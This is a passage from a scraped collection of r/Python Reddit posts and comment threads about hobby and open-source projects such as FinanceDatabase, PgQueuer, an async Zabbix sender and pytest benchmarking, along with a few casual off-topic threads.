    "post_content": "In my spare time I like to go through financial data to understand what kind of companies exist, how sectors and industries evolve and to test theoretical frameworks. However, I found that it required a lot of effort to figure out which companies belong to which industry and I often ran into paywalls that blocked me from accessing the exact data I was looking for. Platforms like Bloomberg offer such services but at ridiculous prices (up to $24.000 a year). This can make investment decisions for the retail investor rather difficult especially if you don't want to follow 'the herd'. I wanted to change that.\nInsert the FinanceDatabase. A database of over 180.000 symbols (80k+ companies, 15k+ ETFs, 30k+ Funds, 3k+ Cryptocurrencies and more) that is fully categorised per country, industry, sector, category and more. It features a 'Searcher' package (pip install FinanceDatabase) that has a user-friendly way of collecting the exact data you want (downloaded straight from the repository). For example, the following code returns all (listed) airlines in the United States (check Examples for more info) :\nimport FinanceDatabase as fd\n\nairlines_us = fd.select_equities(country='United States', industry='Airlines')\nAnd the following gives insights in ETFs that have anything to do with 'semiconductor':\nimport FinanceDatabase as fd\n\nall_etfs = fd.select_etfs()\nsemiconductor_etfs = fd.search_products(all_etfs, 'semiconductor')\nWhat I explicitly am not trying to do is re-invent the wheel (again) of Fundamental Data gathering as there are tons of packages out there that do that already (i.e. FundamentalAnalysis, yfinance, sec-edgar) but instead allow you to capture sector, industries, specific types of ETFs or cryptocurrencies that would have otherwise resulted in a lot of manual work. Then, when you have this sub-selection you can make use of the earlier mentioned packages.\nIf you want to know what is available inside the Database, please have a look here. Alternatively, you can do the following (an example):\nimport FinanceDatabase as fd\n\nequities_countries = fd.show_options('equities','countries') # or sector/industry\netfs_categories = fd.show_options('etfs')\ncryptocurrencies = fd.show_options('cryptocurrencies')\nI hope this can help some of you out making (better) investment decisions and all feedback (positive and negative) and contribution is much appreciated.\nEDIT: Thanks for the rewards and kind words everyone!",
    "comments": [
        {
            "author": "vabruce",
            "score": "217",
            "content": "I love just scanning reddit and then, bam, something really neat and useful. Well done!",
            "replies": [
                {
                    "author": "fraud_93",
                    "score": "31",
                    "content": "I feel so happy when I find something that is not a new model of blog, file manager... Usually I see new programmers claiming they can't find people to contribute, this is the kind of project I would gladly help if needed."
                },
                {
                    "author": "420spark",
                    "score": "7",
                    "content": "Same last week someone posted a data analysis tool that analyzed Twitter feeds and stock market correlations and im mad I didn't save it cause I can't find it anymore.",
                    "replies": [
                        {
                            "author": "boomjynx-",
                            "score": "3",
                            "content": "Not sure if its this one? This is reddit threads, not twitter as you mentioned... https://unbiastock.com/",
                            "replies": [
                                {
                                    "author": "Traditional_Yogurt",
                                    "score": "2",
                                    "content": "Hah, that is brilliant. It also has Reddit as far as I can see. Interesting to see how the Reddit score (of WallStreetBets) is often too late on pretty much any stock. However, it is unknown what 'Reddit Score' actually means."
                                },
                                {
                                    "author": "TheForestMan",
                                    "score": "1",
                                    "content": "Thank you you noble sir."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "LukePfaff",
            "score": "46",
            "content": "This isn’t what we asked for, but it’s what we needed!!"
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "Hmm that makes a lot of sense. Any legal issues for me personally? Otherwise I need to rethink if I want to keep this database up or not.",
            "replies": [
                {
                    "author": "Traditional_Yogurt",
                    "score": "27",
                    "content": "Hmm that makes a lot of sense. Any legal issues for me personally? Otherwise I need to rethink if I want to keep this database up or not."
                }
            ]
        },
        {
            "author": "jmarke17",
            "score": "20",
            "content": "Great work! 👏🏻👏🏻"
        }
    ]
},
{
    "post_author": "BenHanson",
    "post_id": "1clpq5l",
    "post_score": "6",
    "post_time": "Monday, May 6, 2024 at 9:05:31 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I've started writing Python bindings for lexertl",
    "media": [
        "https://github.com/BenHanson/pylexertl",
        "https://github.com/BenHanson/parsertl17"
    ],
    "post_content": "See https://github.com/BenHanson/pylexertl\nI will see about registering as an official library when I am happy I have completed all the bindings. I added all the missing functions for the rules objects today, so things are in reasonable shape already.\nMy python experience has been limited up until now, but it is big for my new role.\nI have a runtime parser generator https://github.com/BenHanson/parsertl17 which I also plan to add bindings for.\nI hope this is of interest to somebody!\nWhat My Project Does\nAllows you to build lexical analysers at runtime and use them to lex text (in this case utf-8)\nTarget Audience\nThe C++ library has been used in production for over 10 years.\nComparison\nI'm not aware of any competing library.",
    "comments": []
},
{
    "post_author": "AutoModerator",
    "post_id": "1cly3uc",
    "post_score": "1",
    "post_time": "Tuesday, May 7, 2024 at 3:00:07 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Tuesday Daily Thread: Advanced questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "PowerPete42",
    "post_id": "priqp7",
    "post_score": "2137",
    "post_time": "Monday, September 20, 2021 at 2:12:53 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Any love for Python 2.5 on an i486?",
    "media": [
        "https://imgur.com/MT7wv1R",
        "https://external-preview.redd.it/IraQoxEGvyhbG0nNUwAeiboNawBogtrvlypFW7qL8Tg.jpg?width=640&crop=smart&auto=webp&s=38e6e3c4b6e8d7df247a4486993a8230aeadb01f"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "189",
            "content": "I can hear that keyboard.",
            "replies": [
                {
                    "author": "PowerPete42",
                    "score": "98",
                    "content": "Got to have the Model M, the sound of the keys helps you establish dominance at work.",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "43",
                            "content": "Only if you maintain eye contact with passers by.",
                            "replies": [
                                {
                                    "author": "PowerPete42",
                                    "score": "33",
                                    "content": "Yes this is a true power move!"
                                }
                            ]
                        },
                        {
                            "author": "[deleted]",
                            "score": "8",
                            "content": "Dude how do you even work with a cock and balls that big ?",
                            "replies": [
                                {
                                    "author": "asday_",
                                    "score": "2",
                                    "content": "Word around the office is you've got a fat cock."
                                }
                            ]
                        },
                        {
                            "author": "rob10501",
                            "score": "2",
                            "content": "workable start languid decide tender uppity fretful society toy middle This post was mass deleted and anonymized with Redact"
                        }
                    ]
                }
            ]
        },
        {
            "author": "LoL4You",
            "score": "39",
            "content": "No turbo button. Very sad"
        },
        {
            "author": "donith913",
            "score": "30",
            "content": "Daaaang. DSL, kernel 2.4… reminds me of my really early Linux days as a kid."
        }
    ]
},
{
    "post_author": "TokenChingy",
    "post_id": "1cnr0g3",
    "post_score": "23",
    "post_time": "Thursday, May 9, 2024 at 10:01:33 AM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Calculating Virtual Cycling Power With Python",
    "media": [
        "https://jasonlei.com/calculating-virtual-cycling-power"
    ],
    "post_content": "I was doing some light reading and stumbled across Steve Gribbles Power vs Speed Calculator and thought I'd give it a go at rebuilding it based on his Physics model using Python. Then I wrote an article about. Thought I'd share it with you all: Calculating Virtual Cycling Power (jasonlei.com)",
    "comments": [
        {
            "author": "cmdrmac",
            "score": "3",
            "content": "This is really neat! Great to see the math and the physics, especially as Python code."
        },
        {
            "author": "muneriver",
            "score": "3",
            "content": "This is super neat - I enjoyed the write-up and the clean code. I'm personally a huge cycling fan and a big python user. I built out this cycling ML model that was trained to predict my power output based on my historical riding data. Check it out if you're interested! https://github.com/jairus-m/StravaCyclingMLProject"
        }
    ]
},
{
    "post_author": "Royal_Section4889",
    "post_id": "1cpw67l",
    "post_score": "0",
    "post_time": "Sunday, May 12, 2024 at 4:10:14 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I've developed a library for send metrics to zabbix asynchronously ",
    "media": [
        "https://github.com/adubkov/py-zabbix",
        "https://github.com/gustavofbreunig/zabbix-sender-async"
    ],
    "post_content": "I have been using zabbix for monitoring a lot of metrics in my work, none of the most popular zabbix were capable of doing async tasks, so I've developed some simple package capable of doing this.\nTests, examples and how-tos can be found here: https://github.com/gustavofbreunig/zabbix-sender-async\nWhat My Project Does\nSend zabbix sender messages using asyncio tasks.\nTarget Audience\nSysAdmins who use Zabbix to monitor a large number of metrics.\nComparison\nInstead of doing traditional way, using these abandoned library: https://github.com/adubkov/py-zabbix\nfrom pyzabbix import ZabbixMetric, ZabbixSender\n\n# Send metrics to zabbix trapper\npacket = [\n  ZabbixMetric('hostname1', 'test[cpu_usage]', 2),\n  ZabbixMetric('hostname1', 'test[system_status]', \"OK\"),\n  ZabbixMetric('hostname1', 'test[disk_io]', '0.1'),\n  ZabbixMetric('hostname1', 'test[cpu_usage]', 20, 1411598020),\n]\n\nresult = ZabbixSender(use_config=True).send(packet)\nYou can do this:\nasync def sendmetrics():\n    sender = AsyncSender('localhost', 10051)\n    metric = ItemData(host='hostname', key='test.metric.text', value='test package import')\n    result = await sender.send(metric)",
    "comments": [
        {
            "author": "arjjov",
            "score": "2",
            "content": "Send is coupled with opening the connection, if you try to send many metrics this won't scale. Also there's no exc/err being handled. To use as a script run once type of thing it can be useful, but as a general client it needs to be improved.",
            "replies": [
                {
                    "author": "Royal_Section4889",
                    "score": "1",
                    "content": "The send is coupled with connection, but you can send an array of metrics, so it opens the connection only once: sender = AsyncSender('localhost', 10051) metrics = [] metrics.append(ItemData('async-sender-test-host', 'test.metric.unsigned', 1234)) metrics.append(ItemData('async-sender-test-host', 'test.metric.float', math.pi)) response = await sender.send(metrics) And about the exception handling, Zabbix responses are too poor on information to do some decent exception handling, but I'm working on this. Thanks for the feedback."
                }
            ]
        },
        {
            "author": "vmpajares",
            "score": "1",
            "content": "I assume that sending them with async in an array you can send multiple metrics in a single call. So you can send more metrics or more often with the same hardware. But, if your server is busy, doesn't the server launch the triggers for not getting the data when it expects them?",
            "replies": [
                {
                    "author": "Royal_Section4889",
                    "score": "1",
                    "content": "I assume that sending them with async in an array you can send multiple metrics in a single call. So you can send more metrics or more often with the same hardware. Correct But, if your server is busy, doesn't the server launch the triggers for not getting the data when it expects them? In a busy server, async calls is even better because the python script can collect metrics and send at same time without using multi threads and the synchronization/mutexes problem. But yes, if the server cannot process messages fast enough, it fires triggers, but these problems we solved using proxies to distribute effort."
                }
            ]
        }
    ]
},
{
    "post_author": "toodarktoshine",
    "post_id": "1ci7m95",
    "post_score": "17",
    "post_time": "Thursday, May 2, 2024 at 8:18:24 AM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "One pytest marker to track the performance of your tests",
    "media": [
        "https://codspeed.io/blog/one-pytest-marker-to-track-the-performance-of-your-tests"
    ],
    "post_content": "Hello Pythonistas!\nI just wrote a blog post about measuring performance inside pytest test cases. We dive into why it’s important to test for performance and how to integrate the measurements in the CI.\nHere is the link to the blog: https://codspeed.io/blog/one-pytest-marker-to-track-the-performance-of-your-tests",
    "comments": [
        {
            "author": "ZeeBeeblebrox",
            "score": "1",
            "content": "When I looked into it I found it weird there was no easy way to run the test multiple times with setup and teardown run between each execution. May I missed something?",
            "replies": [
                {
                    "author": "toodarktoshine",
                    "score": "1",
                    "content": "There are multiple ways to have setup and teardown working with pytest. You can use setup_* or teardown_* functions, like explained in the x-unit style pytest setup docs. But the recommended pytestway of writing same is to use fixtures (I really recommend reading the docs about it, they are quite well written). A simple setup will look like this import pytest @pytest.fixture def setup(): data = generate_data()        # < will run before the test yield data                    # < pass data to the test data.clear()                  # < will run after the test def test_my_fn(setup, benchmark): # < you can use multiple fixture data = setup result = benchmark(my_fn, data) assert result == \"expected\"p Note that CodSpeed will run your benchmarks only once, as what is measured is the CPU instructions, and not the wall clock time. Hope this helps!"
                }
            ]
        }
    ]
},
{
    "post_author": "abredvariant",
    "post_id": "kv0u3w",
    "post_score": "2137",
    "post_time": "Monday, January 11, 2021 at 2:25:05 PM GMT+3",
    "flair_text": "Beginner Showcase",
    "post_title": "Programming + Math + Graphs = Art",
    "media": [
        "https://preview.redd.it/c8z3mrmbuoa61.jpg?width=640&crop=smart&auto=webp&s=f0824ecbd8df45e7ab3f9bb0710e18cb87da8ac1",
        "https://i.redd.it/c8z3mrmbuoa61.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "ComfortableEye5",
            "score": "125",
            "content": "Isnt it a little disorienting to code on a curved monitor",
            "replies": [
                {
                    "author": "Asbestos_Addict13",
                    "score": "53",
                    "content": "If you angle it the right way, you can’t tell the difference",
                    "replies": [
                        {
                            "author": "cubed_npc",
                            "score": "57",
                            "content": "This, you only notice the curve if you are sitting off-center. I moved from dual-monitors to 1 ultra wide curved last year and have no desire to go back.",
                            "replies": [
                                {
                                    "author": "MagnitskysGhost",
                                    "score": "16",
                                    "content": "Been curious about this – are you on Windows? How easy is it to arrange windows on the workspace with keyboard shortcuts? Currently using two monitors and typically have like 4 windows open equally sized, do the Win+Arrow keys shortcuts behave well?"
                                },
                                {
                                    "author": "j_mcc99",
                                    "score": "1",
                                    "content": "I moved from two flats to two 34” curved. It’s a game changer. Your eyes don’t have to adjust focus. The screen is always in focus."
                                }
                            ]
                        },
                        {
                            "author": "[deleted]",
                            "score": "9",
                            "content": "That's not true. The download bars are longer on curved surfaces, so the screen makes your internet slower"
                        }
                    ]
                }
            ]
        },
        {
            "author": "TankorSmash",
            "score": "45",
            "content": "You can use the 'print screen' key to screenshot your desktop, or hit Win+Shift+S to capture just a bit of it."
        },
        {
            "author": "NoblySP",
            "score": "20",
            "content": "What is the VS Code theme you are using?"
        }
    ]
},
{
    "post_author": "GabelSnabel",
    "post_id": "1ckrmog",
    "post_score": "127",
    "post_time": "Sunday, May 5, 2024 at 4:46:07 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Introducing PgQueuer: A Minimalist Python Job Queue Built on PostgreSQL",
    "media": [
        "https://github.com/janbjorge/PgQueuer"
    ],
    "post_content": "What My Project Does\nPgQueuer is a Python library designed to manage job queues using PostgreSQL features. It leverages PostgreSQL's native LISTEN/NOTIFY, along with advanced locking mechanisms, to handle job queues efficiently. This allows for real-time job processing, concurrency, and reliable task execution without the need for a separate queuing system.\nTarget Audience\nPgQueuer is ideal for developers and teams who already use PostgreSQL in their projects and are looking for a simple, integrated way to handle background tasks and job queues. It's designed for production use, offering a dependable solution that scales seamlessly with existing PostgreSQL databases.\nComparison\nUnlike many other job queue solutions that require additional services or complex setups (such as Redis or RabbitMQ), PgQueuer operates directly within PostgreSQL. This removes the overhead of integrating and maintaining separate systems for job management.\nHow PgQueuer stands out\nIntegration Simplicity: Integrates directly with existing PostgreSQL setups without additional infrastructure.\nEfficiency: Uses PostgreSQL’s FOR UPDATE SKIP LOCKED for high concurrency, allowing multiple workers to process tasks simultaneously without conflict.\nReal-time Updates: Utilizes PostgreSQL's LISTEN/NOTIFY for immediate job processing updates, reducing latency compared to polling-based systems.\nRequest for Feedback on Useful Features\nIm always looking to improve PgQueuer and make it more useful for our users. If you have any features you'd like to see, or if there's something you think could be improved, please let me know! Your feedback is invaluable! Share your thoughts, suggestions, or feature requests either here in the comments or via GitHub.",
    "comments": [
        {
            "author": "abrazilianinreddit",
            "score": "47",
            "content": "You should probably cross-post this to r/django, given that it's one of the largest python web frameworks, job queues are always a hot-topic there, and postgres is the recommended database for django. In fact, I'd suggest that, if possible, you write a \"integrating with django\" section in your documentation, that would surely help garner attention from that demographic.",
            "replies": [
                {
                    "author": "grudev",
                    "score": "8",
                    "content": "For sure. I'll try this with a Django app. Using Postgres for queues is even more interesting now that Redis is pulling those shenanigans",
                    "replies": [
                        {
                            "author": "abrazilianinreddit",
                            "score": "2",
                            "content": "Using Postgres for queues is even more interesting now that Redis is pulling those shenanigans Sorry if this is a bit off-topic, but what kind of shenanigans is Redis pulling? I'm afraid I'm not up-to-date on the topic.",
                            "replies": [
                                {
                                    "author": "LivedAllOver",
                                    "score": "5",
                                    "content": "Licensing change"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "cpressland",
            "score": "15",
            "content": "A friend of mine wrote qbert which more or less does the same thing. I’m still not sure I’m sold on Postgres queuing vs AMQP/MQTT/RQ, but good to see more examples of it.",
            "replies": [
                {
                    "author": "GabelSnabel",
                    "score": "15",
                    "content": "Thanks for the mention of qbert! It's always interesting to see how different projects tackle similar challenges. One of the key distinctions with PgQueuer is its use of PostgreSQL's LISTEN/NOTIFY feature instead of polling? My approach leverages PostgreSQL's built-in capabilities to react to queue changes in real time, which can lead to more efficient resource usage and quicker response times compared to traditional polling methods."
                }
            ]
        },
        {
            "author": "RevolutionaryRain941",
            "score": "6",
            "content": "Superb. I don't really see a major flaw in this. Well done.",
            "replies": [
                {
                    "author": "GabelSnabel",
                    "score": "4",
                    "content": "Thank you for the encouragement! If you have any suggestions feel free to share in the future."
                }
            ]
        },
        {
            "author": "littlemetal",
            "score": "4",
            "content": "Interesting, and very nice work the sql side. Is the focus here PG or python, though? If it is python, how would this replace something like https://python-rq.org/ or provide an alternate backend for it or celery? The sql side made met think of this: https://github.com/tembo-io/pgmq, which also feel very much still a work in progress. Their presentation at pgconf: https://www.youtube.com/watch?v=GG2C7gktfoQ A lightweight message queue. Like AWS SQS and RSMQ but on Postgres. Lightweight - No background worker or external dependencies, just Postgres functions packaged in an extension Guaranteed \"exactly once\" delivery of messages to a consumer within a visibility timeout API parity with AWS SQS and RSMQ Messages stay in the queue until explicitly removed Messages can be archived, instead of deleted, for long-term retention and replayability",
            "replies": [
                {
                    "author": "GabelSnabel",
                    "score": "2",
                    "content": "Thanks for the comment and the references! PgQueuer is designed with a dual focus on both PostgreSQL and Python, aiming to leverage existing PostgreSQL infrastructure to manage queues efficiently. This approach minimizes the need for additional dependencies or external queue management systems. While tools like RQ and Celery are fantastic for task management across various backends, PgQueuer offers a simplified, database-centric approach, making it ideal for projects already invested in PostgreSQL. I provide a straightforward way to integrate queuing directly within the database layer, which can be particularly beneficial for systems where minimizing architectural complexity is crucial"
                }
            ]
        },
        {
            "author": "farsass",
            "score": "4",
            "content": "You should add transactional enqueuing to the API... somewhat wasteful not to offer it if you are focusing on postgres."
        },
        {
            "author": "openwidecomeinside",
            "score": "1",
            "content": "Amazing, will take a look tomorrow and see how i can contribute :)"
        }
    ]
},
{
    "post_author": "writer_on_rails",
    "post_id": "1ci4l9t",
    "post_score": "27",
    "post_time": "Thursday, May 2, 2024 at 5:32:06 AM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "How to create architecture diagrams from code in Jupyter Notebook",
    "media": [
        "https://ashgaikwad.substack.com/p/how-to-create-architecture-diagrams"
    ],
    "post_content": "Hello world,I wrote an article about creating diagrams from code on Jupyter Notebook inside VS Code. It will give you a brief on the setup and also an overview of concepts. Within 5 minutes, you should be able to start making cool architecture diagrams.\n[TO MODERATOR: This link does not contain any paywalled or paid content. All the contents are available for free]\nArticle link: https://ashgaikwad.substack.com/p/how-to-create-architecture-diagrams",
    "comments": [
        {
            "author": "Dr-NULL",
            "score": "1",
            "content": "Great! Check out Kroki! It also has a jupyter magic plugin.",
            "replies": [
                {
                    "author": "writer_on_rails",
                    "score": "0",
                    "content": "This looks interesting 😀. Thanks for sharing. I'll try it out. Kroki is much bigger in terms of functionality, it might satisfy some of my other use cases apart from arch/cloud diagrams"
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cl5cl2",
    "post_score": "8",
    "post_time": "Monday, May 6, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Monday Daily Thread: Project ideas!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "mekmookbro",
            "score": "2",
            "content": "Ok here's one. Project Idea: YouTube RSS Difficulty: Beginner / Intermediate Tech Stack: Python, File RW Description: Enter your favorite YouTube channels' URLs in a CSV file. Create a script that reads that CSV file, fetches the latest uploaded video titles, and saves them in a separate CSV file. And run a function every 5 minutes to check if any of those channels have a new video uploaded by comparing the latest uploaded video title to the saved titles in the CSV file. Make it run in the background, and show a messagebox on the screen saying \"X channel uploaded Y video.\" when a new video is uploaded. Resources: Pytube"
        }
    ]
},
{
    "post_author": "JimJimBerry",
    "post_id": "1cjt02h",
    "post_score": "9",
    "post_time": "Saturday, May 4, 2024 at 8:33:20 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Suggestions for python libraries to contribute to",
    "media": [],
    "post_content": "Hey, python folks ! I have been coding in python for around 3 years, 2 years professionally. I have worked with asyncio, typing and other stuff that is needed to build a server. I was looking for a small but impactful enough open source core python library/application to work on. I tried cpython but it seems to be beyond my capability at the moment. As for my interests I was interested in lower level stuff as well as libraries like asyncio and celery. Any suggestions for libraries that could use a bit of help and teach me some stuff as well would be appreciated",
    "comments": [
        {
            "author": "Simultaneity_",
            "score": "34",
            "content": "You should only contribute to tools that you use and are familiar with. Otherwise, you will spend a lot of your time trying to understand how a project is set up or making poor-quality pull requests because of your unfamiliarity. Why not work with asynchio? It sounds as if you are quite familiar with it.",
            "replies": [
                {
                    "author": "JimJimBerry",
                    "score": "-3",
                    "content": "Problem is asyncio is integrated with the cpython codebase which is quite difficult to navigate and understand",
                    "replies": [
                        {
                            "author": "ForeignSource0",
                            "score": "6",
                            "content": "There are some low-ish hanging fruits on wireup, a dependency injection library I maintain if you want to take a look. There's a few issues open. New integrations with frameworks are always welcome. https://github.com/maldoinc/wireup But I will +1 the sentiment that you should look to first contribute to things you're using in a sort of scratch your own itch. That way you know what needs to change and you can propose changes upstream."
                        }
                    ]
                }
            ]
        },
        {
            "author": "riksi",
            "score": "6",
            "content": "Try contributing to gevent as an alternative to asyncio. You can contribute to opentelemtry (and it's contrib modules) which should touch many parts."
        },
        {
            "author": "gagarin_kid",
            "score": "6",
            "content": "\"I want to contribute to open source project by grapping the low hanging fruits\" - I think the low hanging fruits are already taken, so you will need to spend time to dig into the code base, its architecture decisions and investigate known issues before adding new features ..."
        },
        {
            "author": "james_pic",
            "score": "3",
            "content": "Most of my contributions to open source projects have either been fixes for bugs I've discovered or features I've implemented because they solved a problem I have. This is most likely a good place for you to start too. If none of them projects you work with have bugs you've encountered or missing features you'd really like, then you're probably best off waiting until you hit a bug or missing feature. If this never happens, then that means these projects are getting on fine without you and you don't need to worry too much about contributing."
        },
        {
            "author": "tomekanco",
            "score": "2",
            "content": "Geemap & leafmap"
        },
        {
            "author": "bear007",
            "score": "1",
            "content": "check out these: https://tomaszs2.medium.com/10-awesome-python-open-source-projects-ep-7-a21405b3070e"
        },
        {
            "author": "my_password_is______",
            "score": "1",
            "content": "https://github.com/pygame-community/pygame-ce/issues"
        },
        {
            "author": "Hey_Look_80085",
            "score": "1",
            "content": "https://www.ursinaengine.org/ is about 20 years behind in usable editor user interface."
        },
        {
            "author": "mon_key_house",
            "score": "1",
            "content": "RemindMe! 3 days"
        },
        {
            "author": "x41260",
            "score": "-1",
            "content": "AutoGen"
        }
    ]
},
{
    "post_author": "jgloewen",
    "post_id": "1cn24ar",
    "post_score": "10",
    "post_time": "Wednesday, May 8, 2024 at 2:22:50 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Tutorial on Creating Useful Data Visuals with Python seaborn and matplotlib libraries",
    "media": [
        "https://johnloewen.substack.com/p/python-mastery-choosing-the-right"
    ],
    "post_content": "With the current global deluge of data and information, there has never been a more important to visualize your data in a clear and simple manner.\nPython is a terrific tool to help us do this.\nThe key to this lies in choosing the the right data visualization techniques to tell the most interesting and relevant story.\nThree useful visuals are:\nsmall multiples\nheat maps\nstacked area charts\nIn this tutorial, using pandas, seaborn, and matplotlib.pyplot, we create the Python code for each data visual\nLink to free Tutorial",
    "comments": [
        {
            "author": "[deleted]",
            "score": "3",
            "content": "Thanks I’ll check it out. I noticed that you use PyCharm. I use Jupyter Lab, which I like because you can run code snippets and track variables. Is there a reason why you’d use PyCharm over Jupyter?",
            "replies": [
                {
                    "author": "dparks71",
                    "score": "4",
                    "content": "They serve pretty different purposes, I always explain it as VSCode is like Flask, Pycharm is like Django and Jupyter is like fastAPI. If you just need a visualization, Jupyter is the lightest and easiest to get started with, if you want to fork and make pull requests for NumPy, you'll probably like some of Pycharm's features.",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "2",
                            "content": "I’m actually trying to incorporate python into dashboard for my company and I’m a heavy Excel user, just wanted to start with something that I would not need to change from down the road. The choice here is PyCharm or Jupyter",
                            "replies": [
                                {
                                    "author": "dparks71",
                                    "score": "3",
                                    "content": "Pycharm will be nice when you go to actually deploy the dashboard or have to maintain it (if that's even on you), but you'll probably still use Jupyter for prototyping visualizations and code if you find you like it (I do). You'll have to do the deployment from the terminal or with web interfaces though if you go with only Jupyter, which isn't bad, and will probably be how most of the documentation is written anyway, pycharm just makes those tasks easier. Again, different tools for different purposes, you don't need to worry about changing, pycharm builds on Jupyter if anything. It's kind of like saying I don't want to learn to drive a car because I might want to be a professional trucker later on. The skills and concepts will mostly transfer."
                                },
                                {
                                    "author": "watermooses",
                                    "score": "3",
                                    "content": "Yeah just to add on to u/dparks71 VS code has a nice Jupyter Notebooks extension.  So I use it a bit like a scratchpad.  I prototype individual functions, or verify file formats and the results of parsing them in Jupyter, then move them into my actual program."
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "jgloewen",
                    "score": "4",
                    "content": "Purely familiarity - I come from a formal teaching background where advanced code editing and debugging tools are more important. I've just been using it for a long time. I know that Jupyter Lab may work better for these types of projects, I just haven't switched over yet. But I do plan to."
                }
            ]
        }
    ]
},
{
    "post_author": "2bytesgoat",
    "post_id": "1cinjg9",
    "post_score": "0",
    "post_time": "Thursday, May 2, 2024 at 9:52:41 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Starter Code for a LLM-based AI Assistant ",
    "media": [
        "https://www.youtube.com/watch?v=2fD_SAouoOs&ab_channel=2BytesGoat",
        "https://github.com/2BYTESGOAT/AI-ASSISTANT"
    ],
    "post_content": "Hey everyone 👋\nTL;DR\nSince everyone is talking about the Humane AI Pin and the Rabbit R1, I decided to make a short 5 minute tutorial on how people can setup and customize their own little AI assistant on their machine.\nI've uploaded a video tutorial here: https://www.youtube.com/watch?v=2fD_SAouoOs&ab_channel=2BytesGoat\nAnd the Github code is here: https://github.com/2BYTESGOAT/AI-ASSISTANT\nLonger version\nWhat my project does: It's the starter code for an AI assistant that you can run locally. More precisely, it's a ChatGPT / Llama 2 agent that has access to Google Search and can get businesses nearby based on your location. The tool can be easily extended to support other APIs.\nTarget audience: Pythoneers that are curious about LLMs and LLM related libraries.\nComparison: It was inspired by projects such as the Humane AI Pin and the Rabbit R1. Though it's a inferior version to those, it serves more as a playground for people to develop their own AI assistants.",
    "comments": [
        {
            "author": "LitanyOfLitany",
            "score": "7",
            "content": "Literally who is talking about those two items",
            "replies": [
                {
                    "author": "Midicide",
                    "score": "5",
                    "content": "People are talking… negatively"
                },
                {
                    "author": "2bytesgoat",
                    "score": "1",
                    "content": "Maybe I’m under the wrong impression, but I feel that since ChatGPT there are a few companies that appeared out of thin air that promise smarter AI assistants than Siri and Alexa. Also lately there was a lot of attention in this direction, since both the Rabbit R1 and Humane Pin got somewhat released. Maybe they’re not the best products yet, but people seemed to be interested in the subject, given all the tech bros making at least one review on them and still getting traction. I just wanted to shine some light on the subject for people that may be curious about them and maybe give some starting points 😅"
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "I can give it a spin and build a webui in Gradio if there are at least 5 people interested of that. Thing is, you would still need to create your own tools for it, which would be a bit hard to do from the UI",
            "replies": [
                {
                    "author": "2bytesgoat",
                    "score": "1",
                    "content": "I can give it a spin and build a webui in Gradio if there are at least 5 people interested of that. Thing is, you would still need to create your own tools for it, which would be a bit hard to do from the UI"
                }
            ]
        }
    ]
},
{
    "post_author": "ninelives_dub",
    "post_id": "8m9ei8",
    "post_score": "2133",
    "post_time": "Saturday, May 26, 2018 at 1:50:51 PM GMT+3",
    "flair_text": "",
    "post_title": "And so it begins... I’ve decided to start a new hobby and hopefully I can make some use out of it. Wish me luck!",
    "media": [
        "https://preview.redd.it/ownnmsh8k6011.jpg?width=640&crop=smart&auto=webp&s=b99cf530052ffe887f36879500bb6c1ec4a00319",
        "https://i.redd.it/ownnmsh8k6011.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "CobbITGuy",
            "score": "493",
            "content": "You took up photography?",
            "replies": [
                {
                    "author": "DR4WKC4B",
                    "score": "152",
                    "content": "Op needs to quit while they’re behind if OP took this pic. This was taken at the wrong angle by 45* to show us the oven OP is using to learn cooking.",
                    "replies": [
                        {
                            "author": "TripleDigit",
                            "score": "81",
                            "content": "Anytime I see reading material near a stovetop, it makes me think of this."
                        },
                        {
                            "author": "ninelives_dub",
                            "score": "22",
                            "content": "😹😹"
                        }
                    ]
                },
                {
                    "author": "ninelives_dub",
                    "score": "11",
                    "content": "Thank you for noticing. :)"
                }
            ]
        },
        {
            "author": "alexbarrett",
            "score": "277",
            "content": "Be careful, collecting headphones can get expensive. It starts with mid-range V-Modas then before you know it you're dropping thousands on custom molded IEMs."
        },
        {
            "author": "Nikota",
            "score": "125",
            "content": "Vandalizing laptops?"
        },
        {
            "author": "hambordamaram",
            "score": "117",
            "content": "Where I got my coding start as well. Currently sitting here watching Python do about six-ten hours of monotonous work for me. Enjoy the journey."
        },
        {
            "author": "bgptcp179",
            "score": "28",
            "content": "Good for you, it's very rewarding. I started off with Zeds book and now into data science/pandas. Keep learning!"
        },
        {
            "author": "Loozerid",
            "score": "25",
            "content": "You probably already know but all of his books are available for free online at inventwithpython.com my local library has them too!"
        },
        {
            "author": "K1NNY",
            "score": "80",
            "content": "Oh boy, I envy you. What I would give to feel the things I felt in the beginning of my own journey. To feel the rush of diving headfirst into the abyss, ignorant of everything ahead of you other than the fact that you intend to come out the other end alive. To first understand the power at your fingertips when you realize that this is what software is made of. To blit your first surface to the screen and watch the buffers flip before your eyes. To send your first set of bytes across a socket to arrive as a legible sentence in your web browser. To be the first of your coworkers to automate that godawful spreadsheet operation that once took each of you hours to complete yet now takes mere seconds. I envy you. Relish these moments. I know I did. Godspeed."
        },
        {
            "author": "mw44118",
            "score": "18",
